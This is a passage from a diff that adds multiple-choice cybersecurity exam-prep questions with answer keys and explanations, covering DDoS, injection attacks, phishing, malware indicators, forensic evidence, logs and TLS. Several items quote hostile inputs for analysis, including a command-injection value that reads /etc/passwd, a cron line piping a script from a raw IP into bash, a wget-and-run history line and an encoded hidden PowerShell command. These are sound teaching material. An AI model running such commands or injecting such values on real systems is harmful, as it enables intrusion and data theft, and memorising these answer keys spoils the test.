+   "q": "A victim gets huge DNS responses from thousands of open resolvers it never queried. The queries were sent with the victim's IP as the source. What is this?",
+   "o": [
+    [
+     "A reflection and amplification DDoS",
+     "Right. Small spoofed queries cause big replies aimed at the victim."
+    ],
+    [
+     "DNS cache poisoning",
+     "Poisoning plants false records. It doesn't flood a victim."
+    ],
+    [
+     "A SYN flood",
+     "This uses DNS replies, not TCP handshakes."
+    ],
+    [
+     "DNS tunneling",
+     "Tunneling sneaks data out. It isn't a flood."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-15",
+   "d": "2.0",
+   "obj": "2.5",
+   "q": "Users on one VLAN get certificate warnings. The ARP table on their PCs maps the gateway IP to a new MAC address that belongs to another PC. What is happening?",
+   "o": [
+    [
+     "On-path attack by ARP spoofing",
+     "Right. Fake ARP replies send gateway traffic to the attacker's machine."
+    ],
+    [
+     "A DHCP starvation attack on the VLAN's DHCP server",
+     "DHCP starvation uses up the address pool. It doesn't change the gateway MAC."
+    ],
+    [
+     "A VLAN hopping attack",
+     "VLAN hopping reaches another VLAN. It doesn't fake the gateway."
+    ],
+    [
+     "A DNS amplification attack",
+     "Amplification floods a victim with replies."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-16",
+   "d": "2.0",
+   "obj": "2.6",
+   "q": "A login form gets this user name: admin' OR '1'='1' --. What is the attacker trying?",
+   "o": [
+    [
+     "SQL injection",
+     "Right. The quote and OR clause try to change the database query so it always returns true."
+    ],
+    [
+     "Cross-site scripting",
+     "XSS injects script for browsers to run."
+    ],
+    [
+     "Command injection",
+     "Command injection targets the operating system shell."
+    ],
+    [
+     "Directory traversal",
+     "Traversal uses ../ to reach files."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-17",
+   "d": "2.0",
+   "obj": "2.6",
+   "q": "A web page that pings a host gets this input: 8.8.8.8; cat /etc/passwd. The response includes the password file. What attack worked?",
+   "o": [
+    [
+     "Command injection",
+     "Right. The semicolon ran a second OS command after ping."
+    ],
+    [
+     "SQL injection",
+     "No database query was changed."
+    ],
+    [
+     "Stored XSS",
+     "No script ran in a browser."
+    ],
+    [
+     "Cross-site request forgery",
+     "CSRF tricks a user's browser into sending a request."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-18",
+   "d": "2.0",
+   "obj": "2.6",
+   "q": "An attacker posts a comment containing a script tag. Every user who later opens that page runs the script, which sends their session cookie to the attacker. What is this?",
+   "o": [
+    [
+     "Stored cross-site scripting",
+     "Right. The script is saved on the site and runs in each visitor's browser."
+    ],
+    [
+     "Reflected cross-site scripting",
+     "Reflected XSS bounces off one crafted link. It isn't saved for every visitor."
+    ],
+    [
+     "SQL injection",
+     "The database stored the comment, but the attack runs in the browser."
+    ],
+    [
+     "Command injection",
+     "No server command ran."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-19",
+   "d": "2.0",
+   "obj": "2.7",
+   "q": "An accounts payable clerk gets a call that sounds exactly like the CFO, asking for an urgent wire. The voice was cloned with AI. Which control BEST stops this?",
+   "o": [
+    [
+     "Call back on a known number before any payment",
+     "Right. Out-of-band verification beats any voice or video, real or fake."
+    ],
+    [
+     "Check the caller ID",
+     "Caller ID is easy to spoof."
+    ],
+    [
+     "Ask the caller a question about the CFO's family",
+     "Public details are easy for attackers to learn."
+    ],
+    [
+     "Install a better spam filter",
+     "This came by phone, so an email filter doesn't help."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-20",
+   "d": "2.0",
+   "obj": "2.7",
+   "q": "Training told staff to spot phishing by bad spelling. Attackers now use AI to write perfect emails. What should training stress INSTEAD?",
+   "o": [
+    [
+     "Check the real domain and verify odd requests",
+     "Right. AI hides writing mistakes, but it can't fake a verified request or a real domain."
+    ],
+    [
+     "Delete any email with a link",
+     "That would block normal business."
+    ],
+    [
+     "Only distrust emails that are written in a foreign language",
+     "AI writes well in any language."
+    ],
+    [
+     "Trust emails that use your name",
+     "Attackers can personalize easily."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-21",
+   "d": "2.0",
+   "obj": "2.7",
+   "q": "A phishing email targets only the CEO and board, using details from their public speeches. What is this called?",
+   "o": [
+    [
+     "Whaling",
+     "Right. Whaling is spear phishing aimed at senior leaders."
+    ],
+    [
+     "Vishing",
+     "Vishing uses voice calls."
+    ],
+    [
+     "Smishing",
+     "Smishing uses text messages."
+    ],
+    [
+     "Pharming",
+     "Pharming sends users to fake sites by tampering with DNS."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-22",
+   "d": "2.0",
+   "obj": "2.8",
+   "q": "Code writes 600 bytes into a 256-byte buffer on the stack and overwrites the return address. Which attack is this?",
+   "o": [
+    [
+     "Buffer overflow",
+     "Right. Writing past the buffer changes where the program jumps next."
+    ],
+    [
+     "SQL injection",
+     "SQL injection targets database queries."
+    ],
+    [
+     "Race condition",
+     "A race condition depends on timing between processes."
+    ],
+    [
+     "Privilege escalation through a weak password",
+     "No password is involved."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-23",
+   "d": "2.0",
+   "obj": "2.8",
+   "q": "A laptop contacts the same domain every 60 seconds with tiny, identical HTTPS requests, even when nobody is using it. What does this MOST likely show?",
+   "o": [
+    [
+     "Command and control beaconing",
+     "Right. Regular, small check-ins with no user are a classic C2 sign."
+    ],
+    [
+     "A Windows Update download running in the background",
+     "Updates download large files, not tiny requests every minute."
+    ],
+    [
+     "Normal web browsing",
+     "Browsing is irregular and needs a user."
+    ],
+    [
+     "A DHCP renewal",
+     "DHCP renews rarely and doesn't use HTTPS."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-24",
+   "d": "2.0",
+   "obj": "2.8",
+   "q": "On a file server, thousands of files are renamed to .locked within minutes and the command vssadmin delete shadows /all /quiet ran. What is happening?",
+   "o": [
+    [
+     "Ransomware",
+     "Right. Mass renames plus deleting shadow copies to block recovery is classic ransomware."
+    ],
+    [
+     "A backup job",
+     "Backups don't rename files or delete shadow copies."
+    ],
+    [
+     "Disk defragmentation",
+     "Defrag doesn't rename files."
+    ],
+    [
+     "A failed patch install",
+     "Patches don't touch user files like this."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-25",
+   "d": "2.0",
+   "obj": "2.9",
+   "q": "A process runs powershell.exe -NoP -W Hidden -EncodedCommand JABjAD0A... What is the attacker MOST likely doing?",
+   "o": [
+    [
+     "Hiding the script with Base64 encoding",
+     "Right. EncodedCommand takes Base64, which hides the real commands from a quick look."
+    ],
+    [
+     "Encrypting the hard drive",
+     "Encoding a command isn't disk encryption."
+    ],
+    [
+     "Updating PowerShell",
+     "Updates don't run hidden, encoded commands."
+    ],
+    [
+     "Running a signed Microsoft maintenance script",
+     "Signed scripts don't need hidden windows or encoding."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-26",
+   "d": "2.0",
+   "obj": "2.9",
+   "q": "Malware sends its C2 traffic over HTTPS to a popular cloud file-sharing site. Why is this hard to detect?",
+   "o": [
+    [
+     "It's encrypted and looks like normal use",
+     "Right. Defenders rarely block popular services, and they can't see inside without decryption."
+    ],
+    [
+     "HTTPS traffic can't be logged",
+     "HTTPS connections are logged all the time. The content is what's hidden."
+    ],
+    [
+     "Cloud file-sharing services delete all of their access logs",
+     "The issue is blending in, not missing logs."
+    ],
+    [
+     "The traffic uses UDP",
+     "HTTPS normally runs over TCP."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-27",
+   "d": "2.0",
+   "obj": "2.9",
+   "q": "An attacker reaches an internal server by sending traffic through a chain of compromised hosts, each relaying to the next. What does this mainly hide?",
+   "o": [
+    [
+     "The attacker's real source",
+     "Right. Proxies and pivots make each hop look like the source."
+    ],
+    [
+     "The payload contents",
+     "Relaying alone doesn't encrypt the payload."
+    ],
+    [
+     "The destination port",
+     "The server still sees the port it's reached on."
+    ],
+    [
+     "The server's own IP address",
+     "The target's address isn't hidden by the chain."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-28",
+   "d": "2.0",
+   "obj": "2.10",
+   "q": "To inspect HTTPS, a firewall decrypts and re-signs traffic. What must be done for users to avoid certificate warnings?",
+   "o": [
+    [
+     "Trust the firewall's CA on every client",
+     "Right. Clients trust the re-signed certificates only if they trust the CA that issued them."
+    ],
+    [
+     "Turn off TLS 1.3 on all servers",
+     "Protocol version doesn't fix trust."
+    ],
+    [
+     "Give the firewall a copy of each website's private key",
+     "You can't get other sites' private keys."
+    ],
+    [
+     "Switch users to HTTP",
+     "That removes encryption altogether."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-29",
+   "d": "2.0",
+   "obj": "2.10",
+   "q": "In TLS, why is asymmetric crypto used only at the start, with symmetric crypto for the rest of the session?",
+   "o": [
+    [
+     "Asymmetric is slow, so it only sets up a key",
+     "Right. Public-key math protects the key exchange. Symmetric ciphers handle bulk data quickly."
+    ],
+    [
+     "Symmetric crypto can't encrypt web traffic",
+     "Symmetric ciphers encrypt nearly all TLS data."
+    ],
+    [
+     "Asymmetric keys expire after the first packet is sent",
+     "Key lifetime isn't the reason."
+    ],
+    [
+     "Symmetric crypto gives non-repudiation",
+     "Signatures, which are asymmetric, give non-repudiation."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-30",
+   "d": "2.0",
+   "obj": "2.10",
+   "q": "How does a browser confirm that a server certificate really came from a trusted CA?",
+   "o": [
+    [
+     "It checks the CA's signature with the CA's public key",
+     "Right. The CA signs with its private key. Anyone can verify with its public key."
+    ],
+    [
+     "It decrypts the certificate with the server's private key",
+     "The browser never has the server's private key."
+    ],
+    [
+     "It asks the server to send the CA's private key",
+     "A CA's private key is never shared."
+    ],
+    [
+     "It compares the certificate's size with a list",
+     "Size proves nothing about who signed it."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-31",
+   "d": "2.0",
+   "obj": "2.11",
+   "q": "A TLS session uses TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384. Which part handles the key exchange?",
+   "o": [
+    [
+     "ECDHE",
+     "Right. Elliptic-curve Diffie-Hellman Ephemeral sets up the shared key."
+    ],
+    [
+     "RSA",
+     "RSA authenticates the server here."
+    ],
+    [
+     "AES_256_GCM",
+     "AES-GCM encrypts the bulk data."
+    ],
+    [
+     "SHA384",
+     "SHA-384 is the hash used in the handshake."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-32",
+   "d": "2.0",
+   "obj": "2.11",
+   "q": "An admin needs one file that holds a server certificate and its private key, protected by a password, to move to a new server. Which format fits?",
+   "o": [
+    [
+     "PKCS #12 (.pfx/.p12)",
+     "Right. PKCS #12 bundles a certificate with its private key behind a password."
+    ],
+    [
+     "PKCS #10",
+     "PKCS #10 is a certificate signing request."
+    ],
+    [
+     "A DER-encoded .cer file",
+     "A .cer file holds the certificate only, not the private key."
+    ],
+    [
+     "PKCS #7 (.p7b)",
+     "PKCS #7 holds certificates and chains, not private keys."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-2-33",
+   "d": "2.0",
+   "obj": "2.11",
+   "q": "A certificate for www.example.com is installed on shop.example.com. Browsers show a name mismatch. Which X.509 field needs shop.example.com added?",
+   "o": [
+    [
+     "Subject Alternative Name",
+     "Right. Browsers check the hostname against the SAN list."
+    ],
+    [
+     "Issuer",
+     "The issuer is the CA, not the site."
+    ],
+    [
+     "Validity period",
+     "Dates don't cause a name mismatch."
+    ],
+    [
+     "Serial number",
+     "The serial number identifies the certificate, not the hostname."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-01",
+   "d": "3.0",
+   "obj": "3.1",
+   "q": "A Linux server's agent alerts when /etc/passwd and /etc/sudoers change outside a maintenance window. Which tool is this?",
+   "o": [
+    [
+     "A HIDS with file integrity monitoring",
+     "Right. A HIDS watches the host itself, including changes to key files."
+    ],
+    [
+     "A network IPS",
+     "A network IPS sees traffic, not file changes on a disk."
+    ],
+    [
+     "A host-based firewall with logging turned on",
+     "A host firewall filters connections. It doesn't watch files."
+    ],
+    [
+     "A NetFlow collector",
+     "NetFlow sees traffic records only."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-02",
+   "d": "3.0",
+   "obj": "3.1",
+   "q": "A laptop on hotel Wi-Fi is outside the corporate firewall. Which control still blocks inbound SMB attempts from other guests?",
+   "o": [
+    [
+     "A host-based firewall",
+     "Right. It runs on the laptop, so it protects it anywhere."
+    ],
+    [
+     "The perimeter NGFW",
+     "The laptop's traffic doesn't pass through it at the hotel."
+    ],
+    [
+     "A network IDS in the data center",
+     "It can't see the hotel network."
+    ],
+    [
+     "Web content filtering",
+     "Web filtering doesn't block inbound SMB."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-03",
+   "d": "3.0",
+   "obj": "3.1",
+   "q": "An endpoint product flags a never-seen file as malicious. No signature matches; a model trained on millions of files scored its traits as likely malware. Which method is this?",
+   "o": [
+    [
+     "Predictive AI (machine learning)",
+     "Right. A trained model predicts maliciousness from features, not exact patterns."
+    ],
+    [
+     "Signature matching",
+     "No signature matched."
+    ],
+    [
+     "Hash allowlisting",
+     "Allowlisting blocks anything not on a list. It doesn't score files."
+    ],
+    [
+     "Rule-based port filtering on the host",
+     "Port filtering doesn't look at files."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-04",
+   "d": "3.0",
+   "obj": "3.1",
+   "q": "Malware rewrites its own code each time it spreads, so every copy has a new hash. Which detection method does this beat MOST easily?",
+   "o": [
+    [
+     "Signature or hash-based antivirus",
+     "Right. Polymorphic code changes the patterns and hashes signatures depend on."
+    ],
+    [
+     "Behavioral monitoring",
+     "The malware still behaves the same way."
+    ],
+    [
+     "Sandbox detonation",
+     "A sandbox watches what the file does."
+    ],
+    [
+     "Predictive AI scoring",
+     "Models look at traits that survive small changes."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-05",
+   "d": "3.0",
+   "obj": "3.2",
+   "q": "Process listing: svchost.exe, path C:\\Users\\Public\\svchost.exe, parent explorer.exe. Why is this suspicious?",
+   "o": [
+    [
+     "Real svchost runs from System32 under services.exe",
+     "Right. The wrong path and wrong parent both point to an impostor."
+    ],
+    [
+     "svchost.exe should never run on Windows",
+     "svchost.exe is a normal Windows process."
+    ],
+    [
+     "explorer.exe isn't allowed to start any other processes",
+     "Explorer starts the programs users open."
+    ],
+    [
+     "Public folders can't hold executables",
+     "They can, which is why attackers use them."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-06",
+   "d": "3.0",
+   "obj": "3.2",
+   "q": "On an Ubuntu server, where should an analyst look FIRST for failed SSH logins?",
+   "o": [
+    [
+     "/var/log/auth.log",
+     "Right. Debian and Ubuntu record authentication, including SSH, in auth.log."
+    ],
+    [
+     "/etc/shadow",
+     "shadow stores password hashes, not login events."
+    ],
+    [
+     "/var/log/dmesg",
+     "dmesg holds kernel messages."
+    ],
+    [
+     "/etc/hosts",
+     "hosts maps names to IP addresses."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-07",
+   "d": "3.0",
+   "obj": "3.2",
+   "q": "A new value appears under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to %AppData%\\upd.exe. What does this give the attacker?",
+   "o": [
+    [
+     "It runs each time the user logs on",
+     "Right. Run keys are a common persistence spot."
+    ],
+    [
+     "Domain admin rights",
+     "A Run key doesn't grant rights."
+    ],
+    [
+     "A way to hide the file from antivirus scans",
+     "Run keys don't hide files."
+    ],
+    [
+     "Encryption for the user's files",
+     "It only starts a program at logon."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-08",
+   "d": "3.0",
+   "obj": "3.2",
+   "q": "A line in /etc/crontab runs */5 * * * * root curl -s hxxp://203.0.113.9/x.sh | bash. What is this MOST likely?",
+   "o": [
+    [
+     "Root persistence that reruns a downloaded script",
+     "Right. cron reruns the attacker's code on a schedule with root rights."
+    ],
+    [
+     "A normal package update job set up by the distribution",
+     "Package updates don't pipe a script from a raw IP into bash."
+    ],
+    [
+     "A log rotation task",
+     "Log rotation doesn't download scripts."
+    ],
+    [
+     "Time sync with an NTP server",
+     "NTP doesn't use curl or bash."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-09",
+   "d": "3.0",
+   "obj": "3.3",
+   "q": "EDR sees a process open LSASS memory with read rights, the way credential dumpers do. No known-bad hash or IP is involved. What is this?",
+   "o": [
+    [
+     "An indicator of attack",
+     "Right. IOAs describe attacker behavior while it's happening."
+    ],
+    [
+     "An indicator of compromise",
+     "IOCs are artifacts left after a compromise, like hashes or IPs."
+    ],
+    [
+     "Chain of custody",
+     "Chain of custody tracks evidence handling."
+    ],
+    [
+     "Threat attribution",
+     "Attribution is naming who did it."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-10",
+   "d": "3.0",
+   "obj": "3.3",
+   "q": "A seized laptop moves from the analyst to a forensic lab. What does chain of custody require?",
+   "o": [
+    [
+     "A record of who held it, when and why",
+     "Right. An unbroken record shows the evidence wasn't tampered with."
+    ],
+    [
+     "A copy of the laptop's warranty",
+     "Warranty info isn't part of custody."
+    ],
+    [
+     "A second analyst's written opinion of the findings and the lab",
+     "A review is useful, but it isn't custody."
+    ],
+    [
+     "A full wipe before transport",
+     "Wiping would destroy the evidence."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-11",
+   "d": "3.0",
+   "obj": "3.3",
+   "q": "Malware in an intrusion has strings in Russian and code shared with a known group. Why should the analyst be careful naming that group?",
+   "o": [
+    [
+     "Attackers reuse tools and plant false flags",
+     "Right. Shared code and language clues can be faked or borrowed."
+    ],
+    [
+     "Attribution is never useful",
+     "Attribution can guide defense. It just needs strong evidence."
+    ],
+    [
+     "Strings in malware are always encrypted",
+     "Many strings are readable, as here."
+    ],
+    [
+     "Only law enforcement may look at malware",
+     "Analysts look at malware every day."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-12",
+   "d": "3.0",
+   "obj": "3.3",
+   "q": "Two alerts arrive at once: one on a domain controller, one on a kiosk PC. Why does knowing the ASSET matter for triage?",
+   "o": [
+    [
+     "The DC's value makes its alert more urgent",
+     "Right. Asset value and role drive priority."
+    ],
+    [
+     "Kiosk PCs can't be attacked",
+     "Any device can be attacked."
+    ],
+    [
+     "Domain controllers don't log events",
+     "DCs log a great deal."
+    ],
+    [
+     "Asset details only matter after the incident has been closed",
+     "Asset context matters most during triage."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-13",
+   "d": "3.0",
+   "obj": "3.4",
+   "q": "In court, the original hard drive pulled from the server is presented instead of a printout of its files. What type of evidence is the drive?",
+   "o": [
+    [
+     "Best evidence",
+     "Right. Best evidence is the original, not a copy or summary."
+    ],
+    [
+     "Corroborative evidence",
+     "Corroborative evidence backs up other evidence."
+    ],
+    [
+     "Indirect evidence",
+     "Indirect evidence needs an inference to prove a fact."
+    ],
+    [
+     "Hearsay",
+     "Hearsay is a secondhand statement."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-14",
+   "d": "3.0",
+   "obj": "3.4",
+   "q": "VPN logs show an account logged in at 23:10. Badge records show the same employee entered the building at 23:05. What role do the badge records play?",
+   "o": [
+    [
+     "Corroborative evidence",
+     "Right. They support the VPN evidence from a separate source."
+    ],
+    [
+     "Best evidence",
+     "Best evidence is the original item itself."
+    ],
+    [
+     "Indirect evidence",
+     "They don't just imply the login. They back up the timeline."
+    ],
+    [
+     "Chain of custody",
+     "Custody tracks handling, not what the evidence shows."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-15",
+   "d": "3.0",
+   "obj": "3.4",
+   "q": "A file was deleted using an account. The analyst concludes the account owner probably deleted it. What kind of evidence is the log?",
+   "o": [
+    [
+     "Indirect (circumstantial) evidence",
+     "Right. It points to the owner only through inference. Someone else could have used the account."
+    ],
+    [
+     "Best evidence",
+     "Best evidence is the original item, not a conclusion about a person."
+    ],
+    [
+     "Corroborative evidence",
+     "Nothing else backs it up yet."
+    ],
+    [
+     "Direct evidence of who acted",
+     "A log shows the account, not the person at the keyboard."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-16",
+   "d": "3.0",
+   "obj": "3.4",
+   "q": "Which is the BEST evidence in a malware case?",
+   "o": [
+    [
+     "The hash-verified disk image",
+     "Right. An original or verified exact copy is best evidence."
+    ],
+    [
+     "An analyst's written summary of what the malware did",
+     "A summary is a description, not the evidence."
+    ],
+    [
+     "A screenshot of the antivirus alert",
+     "A screenshot is a copy of one view."
+    ],
+    [
+     "The user's memory of what happened",
+     "Recollection is weaker than the original data."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-17",
+   "d": "3.0",
+   "obj": "3.5",
+   "q": "Windows Security log for one account: 30 events with ID 4625, then one 4624, all from 198.51.100.44 within two minutes. What happened?",
+   "o": [
+    [
+     "A password-guessing attack that succeeded",
+     "Right. 4625 is a failed logon and 4624 a successful one."
+    ],
+    [
+     "The account was locked out",
+     "A lockout is event 4740."
+    ],
+    [
+     "The account was created",
+     "Account creation is event 4720."
+    ],
+    [
+     "The audit log was cleared",
+     "Clearing the log is event 1102."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-18",
+   "d": "3.0",
+   "obj": "3.5",
+   "q": "Right after a suspicious admin logon, a server logs event ID 1102. Why does this matter?",
+   "o": [
+    [
+     "Someone cleared the Security log",
+     "Right. 1102 means the audit log was cleared."
+    ],
+    [
+     "The server rebooted normally after installing updates",
+     "Reboots log other events, such as 6005 and 6006."
+    ],
+    [
+     "A user changed their password",
+     "Password changes are 4723 and 4724."
+    ],
+    [
+     "A scheduled task finished",
+     "Task events aren't 1102."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-19",
+   "d": "3.0",
+   "obj": "3.5",
+   "q": "Apache log: 203.0.113.7 GET /item.php?id=5%20UNION%20SELECT%20username,password%20FROM%20users 200 18733. Normal responses are about 2,000 bytes. What does this suggest?",
+   "o": [
+    [
+     "Successful SQL injection",
+     "Right. A UNION SELECT with a 200 and a much larger response points to success."
+    ],
+    [
+     "A failed cross-site scripting attempt",
+     "This is SQL, not script."
+    ],
+    [
+     "A normal product page view",
+     "Normal views don't carry UNION SELECT."
+    ],
+    [
+     "A blocked request",
+     "A 200 status means the server answered it."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-20",
+   "d": "3.0",
+   "obj": "3.5",
+   "q": "A user's .bash_history shows: wget hxxp://198.51.100.3/k; chmod +x k; ./k &; history -c. What should the analyst conclude?",
+   "o": [
+    [
+     "A file was fetched, run, and history wiped",
+     "Right. Download, make executable, run, then cover tracks."
+    ],
+    [
+     "The user installed an approved package from the repository",
+     "Approved packages come through the package manager, not raw IPs."
+    ],
+    [
+     "Only a directory listing was made",
+     "No ls command was run."
+    ],
+    [
+     "The commands failed",
+     "Nothing here shows a failure."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-21",
+   "d": "3.0",
+   "obj": "3.6",
+   "q": "A sandbox report says the sample made a mutex, copied itself to %AppData%, added a Run key and queried 40 random-looking domains. What does the domain list suggest?",
+   "o": [
+    [
+     "A DGA searching for C2",
+     "Right. Many random domains point to a DGA that searches for a live C2 server."
+    ],
+    [
+     "A normal software update check against the vendor's servers",
+     "Updaters contact a few fixed vendor domains."
+    ],
+    [
+     "Printer discovery",
+     "Printers aren't found through random internet domains."
+    ],
+    [
+     "A failed license check",
+     "License checks use one vendor server."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-22",
+   "d": "3.0",
+   "obj": "3.6",
+   "q": "A sample did nothing in a 2-minute sandbox run. Static analysis shows it calls Sleep for 15 minutes first. What is the right conclusion?",
+   "o": [
+    [
+     "It may be stalling, so run it longer",
+     "Right. Long sleeps are a common way to outwait short sandbox runs."
+    ],
+    [
+     "The file is harmless",
+     "No activity in 2 minutes doesn't prove anything."
+    ],
+    [
+     "The sandbox is broken",
+     "The sandbox did its job. The sample waited."
+    ],
+    [
+     "The sample only runs on Linux, not on Windows",
+     "Sleep calls don't show the platform."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-23",
+   "d": "3.0",
+   "obj": "3.6",
+   "q": "A hash scores 0 of 70 on a reputation site, but the sandbox shows it encrypting files and deleting shadow copies. What should the analyst trust?",
+   "o": [
+    [
+     "The behavior seen in the sandbox",
+     "Right. A new sample can be unknown to engines but still act maliciously."
+    ],
+    [
+     "The 0 of 70 score",
+     "No detections often just means the file is new."
+    ],
+    [
+     "The file name",
+     "File names are easy to fake."
+    ],
+    [
+     "The file size",
+     "Size says nothing about intent."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-24",
+   "d": "3.0",
+   "obj": "3.6",
+   "q": "From a sandbox report, which artifact BEST helps block the same malware at the network edge?",
+   "o": [
+    [
+     "Its C2 domain and IP",
+     "Right. Network indicators can be blocked at the firewall, DNS and proxy."
+    ],
+    [
+     "The mutex name",
+     "A mutex is useful for host searches, not network blocking."
+    ],
+    [
+     "The registry key it added for persistence",
+     "Registry keys live on hosts."
+    ],
+    [
+     "The process ID in the sandbox",
+     "PIDs change every run."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-25",
+   "d": "3.0",
+   "obj": "3.7",
+   "q": "The team blocks a malware hash. The attacker adds one byte to the file and sends it again. What happens?",
+   "o": [
+    [
+     "Its hash is totally new, so it gets through",
+     "Right. Any change creates a different hash, so exact-hash blocks are fragile."
+    ],
+    [
+     "The hash stays almost the same",
+     "Cryptographic hashes change completely with any change."
+    ],
+    [
+     "The file can't run anymore",
+     "One added byte usually doesn't break the file."
+    ],
+    [
+     "The block still works because the file name is the same",
+     "Hash blocks don't look at names."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-26",
+   "d": "3.0",
+   "obj": "3.7",
+   "q": "Which domain does this URL REALLY belong to: hxxps://paypal.com.secure-login.example.ru/account?",
+   "o": [
+    [
+     "example.ru",
+     "Right. The registered domain is read from the right: example.ru. The rest are subdomains."
+    ],
+    [
+     "paypal.com",
+     "paypal.com is only a subdomain label here."
+    ],
+    [
+     "secure-login.com",
+     "No such domain appears in the URL."
+    ],
+    [
+     "account",
+     "account is part of the path."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-27",
+   "d": "3.0",
+   "obj": "3.7",
+   "q": "Why do many teams prefer SHA-256 over MD5 for evidence and malware hashes?",
+   "o": [
+    [
+     "MD5 has practical collisions",
+     "Right. SHA-256 has no known practical collisions."
+    ],
+    [
+     "SHA-256 hashes are shorter",
+     "SHA-256 output is longer than MD5's."
+    ],
+    [
+     "MD5 can't hash executables",
+     "MD5 can hash any file."
+    ],
+    [
+     "SHA-256 also encrypts the file while it hashes it",
+     "Hashing doesn't encrypt."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-3-28",
+   "d": "3.0",
+   "obj": "3.7",
+   "q": "An email link shows as apple.com, but the actual link is xn--pple-43d.com. What is this?",
+   "o": [
+    [
+     "A Punycode look-alike domain",
+     "Right. xn-- marks Punycode, which can make a fake domain look like a real one."
+    ],
+    [
+     "Apple's official short link for marketing emails",
+     "Official Apple links use apple.com."
+    ],
+    [
+     "A URL shortener",
+     "Shorteners don't use xn-- names."
+    ],
+    [
+     "An IPv6 address",
+     "IPv6 addresses don't look like this."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-01",
+   "d": "4.0",
+   "obj": "4.1",
+   "q": "Event: [1:2019401:3] ET TROJAN Possible beacon detected, 10.2.3.4:51122 -> 198.51.100.8:80. Which technology made it?",
+   "o": [
+    [
+     "An IDS/IPS",
+     "Right. Signature IDs like 1:2019401 and rule names come from IDS/IPS rules."
+    ],
+    [
+     "NetFlow",
+     "NetFlow has no signatures or rule names."
+    ],
+    [
+     "A web proxy",
+     "Proxy logs show URLs, users and actions."
+    ],
+    [
+     "Antivirus on the host",
+     "Antivirus names files and detections, not network signature IDs."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-02",
+   "d": "4.0",
+   "obj": "4.1",
+   "q": "Record: 10.1.4.20 > 203.0.113.5, TCP 443, 1,212 packets, 1.8 MB, start 09:14:02, end 09:31:40. No payload. Which source is this from?",
+   "o": [
+    [
+     "NetFlow",
+     "Right. Flow records hold addresses, ports, counts and times, without content."
+    ],
+    [
+     "Full packet capture",
+     "A capture would include the payload."
+    ],
+    [
+     "IDS alert",
+     "Nothing here names a rule or attack."
+    ],
+    [
+     "Email filter log",
+     "Email logs show senders, recipients and attachments."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-03",
+   "d": "4.0",
+   "obj": "4.1",
+   "q": "Log: user=asmith app=Dropbox action=deny reason=policy. Which technology wrote this?",
+   "o": [
+    [
+     "Network application control",
+     "Right. It identified the app by name and enforced a policy on it."
+    ],
+    [
+     "Traditional stateful firewall",
+     "A stateful firewall knows ports, not app names."
+    ],
+    [
+     "Host antivirus",
+     "Antivirus scans files. It doesn't block apps by policy."
+    ],
+    [
+     "NetFlow collector",
+     "NetFlow can't deny traffic."
+    ]
+   ],
+   "a": 0
+  },
+  {
+   "id": "cb-4-04",
+   "d": "4.0",
+   "obj": "4.2",
+   "q": "Malware sent 2 GB out of the network last month. No tool raised an alert. Which outcome is this?",
+   "o": [
